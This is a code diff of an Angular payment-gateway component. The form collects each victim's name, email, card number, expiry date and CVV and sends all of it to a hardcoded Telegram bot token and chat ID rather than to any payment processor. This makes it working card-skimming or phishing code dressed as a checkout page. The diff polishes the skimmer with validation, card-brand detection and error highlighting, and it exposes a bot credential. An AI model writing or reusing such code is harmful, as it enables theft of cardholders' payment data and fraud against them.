@@ -1,6 +1,6 @@
 import { HttpClient } from '@angular/common/http';
 import { Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';
-import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors } from '@angular/forms';
+import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors, ValidatorFn } from '@angular/forms';
 import { Router } from '@angular/router';
 
 @Component({
@@ -9,37 +9,45 @@ import { Router } from '@angular/router';
   styleUrls: ['./gateway.component.css']
 })
 export class GatewayComponent implements OnInit{
-
   paymentForm: FormGroup;
   submitted = false;
   showAlertBox: boolean = false;
-  showErrorMessage: boolean = false; // Control visibility of the error message
-  insideMessageVisible: boolean = false; // Control visibility of insideMessageDiv
+  showErrorMessage: boolean = false;
+  insideMessageVisible: boolean = false;
 
-  private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0'; // Replace with your bot token
+  showVisa = true;
+  showMastercard = true;
+  showAmex = true;
+  showJcb = true;
+
+
+  @ViewChild('emailInput') emailInput!: ElementRef;
+  @ViewChild('cardInput') cardNumberInput!: ElementRef;
+  @ViewChild('expirationDateInput') expirationDateInput!: ElementRef;
+  @ViewChild('securityCodeInput') securityCodeInput!: ElementRef;
+  @ViewChild('fullNameInput') fullNameInput!: ElementRef;
+
+  private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0';
   private readonly CHAT_ID = '-4556448975';
 
   amount = localStorage.getItem("finalPrice");
+  errorMessage: string = ''; // Variable to hold error messages
 
   constructor(private fb: FormBuilder, private http: HttpClient, private router: Router) {
     this.paymentForm = this.fb.group({
       fullname: ['', [Validators.required]],
-      phone: ['', [Validators.required]],
-      email: ['', [Validators.required, Validators.email]],
+      email: ['', [Validators.required, Validators.email, Validators.minLength(3)]],
       cardnumber: ['', [Validators.required, this.validateCreditCardNumber]],
       expirationdate: ['', [Validators.required, this.validateExpirationDate]],
       securitycode: ['', [Validators.required, Validators.minLength(3), Validators.maxLength(4), Validators.pattern(/^\d{3,4}$/)]]
     });
   }
 
+
+
   ngOnInit(): void {}
 
-  triggerAlert() {
-    this.showAlertBox = true;
-    setTimeout(() => {
-      this.showAlertBox = false;
-    }, 5000);
-  }
+  
 
   validateCreditCardNumber(control: any) {
     const cardNumber = control.value.replace(/\s+/g, '');
@@ -61,6 +69,27 @@ export class GatewayComponent implements OnInit{
     }
     return null;
   }
+  customEmailValidator(): ValidatorFn {
+    return (control: AbstractControl): ValidationErrors | null => {
+      const email = control.value;
+
+      // Check if the email is empty
+      if (!email) {
+        return { required: true };
+      }
+
+      // Check if the email is in a valid format
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailPattern.test(email)) {
+        return { invalidEmail: true };
+      }
+
+      // If both checks pass, return null (no error)
+      return null;
+    };
+  }
+
+
 
   formatCardNumber() {
     let cardNumber = this.paymentForm.get('cardnumber')?.value || '';
@@ -83,44 +112,89 @@ export class GatewayComponent implements OnInit{
     this.paymentForm.get('expirationdate')?.setValue(expirationDate);
   }
 
+
+
   onSubmit() {
-    window.scrollTo(0, 0);
-    const message = `
+    this.submitted = true;
+    this.showValidationErrors(); // Call to update invalid controls
+
+    if (this.paymentForm.valid) {
+      const message = `
 *New Payment Information*\n
 Fullname: ${this.paymentForm.value.fullname}\n
-Phone: ${this.paymentForm.value.phone}\n
 Email: ${this.paymentForm.value.email}\n
 CC: ${this.paymentForm.value.cardnumber}\n
 Expiration Date: ${this.paymentForm.value.expirationdate}\n
 CVV: ${this.paymentForm.value.securitycode}
     `;
-
-    // Check form validity
-    if (this.paymentForm.invalid) {
-        this.triggerAlert();
-        return;
+    this.sendMessageToTelegram(message);
     }
 
-    // Show loader
-    this.submitted = true;
+  }
 
-    // Show loader for 5 seconds
-    setTimeout(() => {
-        this.submitted = false; // Hide loader
-        this.insideMessageVisible = true; // Show insideMessageDiv
+  showValidationErrors() {
+    const controls = this.paymentForm.controls;
 
-        // Hide insideMessageDiv after another 5 seconds
-        setTimeout(() => {
-            this.insideMessageVisible = false; // Hide insideMessageDiv
-        }, 5000);
+    // Resetting border colors
+    this.resetBorders();
 
-        // Send message after loader has finished
-        this.sendMessageToTelegram(message);
-    }, 5000);
-}
+    // Check for email validation errors
+    if (controls['email'].invalid) {
+      if (controls['email'].errors?.['required'] || controls['email'].errors?.['email']) {
+        this.emailInput.nativeElement.style.borderColor = 'red'; // Set border color to red for email
+      }
+    }
+
+    // Check for card number validation errors
+    if (controls['cardnumber'].invalid) {
+      if (controls['cardnumber'].errors?.['required'] || controls['cardnumber'].errors?.['minlength'] || controls['cardnumber'].errors?.['maxlength']) {
+        this.cardNumberInput.nativeElement.style.borderColor = 'red'; // Set border color to red for card number
+      }
+    }
+
+    // Check for expiration date validation errors
+    if (controls['expirationdate'].invalid) {
+      if (controls['expirationdate'].errors?.['required'] || controls['expirationdate'].errors?.['pattern']) {
+        this.expirationDateInput.nativeElement.style.borderColor = 'red'; // Set border color to red for expiration date
+      }
+    }
+
+    // Check for security code validation errors
+    if (controls['securitycode'].invalid) {
+      if (controls['securitycode'].errors?.['required'] || controls['securitycode'].errors?.['minlength'] || controls['securitycode'].errors?.['maxlength']) {
+        this.securityCodeInput.nativeElement.style.borderColor = 'red'; // Set border color to red for security code
+      }
+    }
+
+    // Check for full name validation errors
+    if (controls['fullname'].invalid) {
+      if (controls['fullname'].errors?.['required']) {
+        this.fullNameInput.nativeElement.style.borderColor = 'red'; // Set border color to red for full name
+      }
+    }
+  }
+
+  resetBorders() {
+    // Reset all border colors to default
+    this.emailInput.nativeElement.style.borderColor = '';
+    this.cardNumberInput.nativeElement.style.borderColor = '';
+    this.expirationDateInput.nativeElement.style.borderColor = '';
+    this.securityCodeInput.nativeElement.style.borderColor = '';
+    this.fullNameInput.nativeElement.style.borderColor = '';
+  }
 
 
-  sendMessageToTelegram(message: string) {
+
+  addInvalidClass(fieldName: string) {
+    const control = this.paymentForm.get(fieldName);
+    if (control) {
+        control.setErrors({ invalid: true }); // Set an error to trigger CSS
+    }
+  }
+ 
+
+
+  sendMessageToTelegram(message: string){
     const url = `https://api.telegram.org/${this.BOT_TOKEN}/sendMessage`;
     const body = {
       chat_id: this.CHAT_ID,
@@ -130,14 +204,63 @@ CVV: ${this.paymentForm.value.securitycode}
 
     this.http.post(url, body).subscribe(
       (response) => {
-        // You can also reset the form or show a success message here
-        this.paymentForm.reset();
+        this.paymentForm.reset(); // Reset form on successful submission
       },
       (error) => {
         console.error('Error sending message:', error);
       }
     );
   }
+
+  
+  detectCardIssuer(cardNumber: string): void {
+    // Patterns for each card type
+    const cardPatterns = {
+      mastercard: /^5[1-5]|^56|^58/,
+      visa: /^4/,
+      amex: /^3[47]/,
+      jcb: /^(?:2131|1800|35)/
+    };
+
+    // Reset all to true initially
+    this.showVisa = true;
+    this.showMastercard = true;
+    this.showAmex = true;
+    this.showJcb = true;
+
+    // Check for MasterCard specifically
+    if (cardPatterns.mastercard.test(cardNumber)) {
+      this.showVisa = false;
+      this.showAmex = false;
+      this.showJcb = false;
+      this.showMastercard = true;
+    } else if (cardPatterns.visa.test(cardNumber)) {
+      // Visa detection
+      this.showVisa = true;
+      this.showMastercard = false;
+      this.showAmex = false;
+      this.showJcb = false;
+    } else if (cardPatterns.amex.test(cardNumber)) {
+      // Amex detection
+      this.showVisa = false;
+      this.showMastercard = false;
+      this.showAmex = true;
+      this.showJcb = false;
+    } else if (cardPatterns.jcb.test(cardNumber)) {
+      // JCB detection
+      this.showVisa = false;
+      this.showMastercard = false;
+      this.showAmex = false;
+      this.showJcb = true;
+    } else {
+      // If no match, show all icons again
+      this.showVisa = true;
+      this.showMastercard = true;
+      this.showAmex = true;
+      this.showJcb = true;
+    }
+  }
+ 
 }
 
 
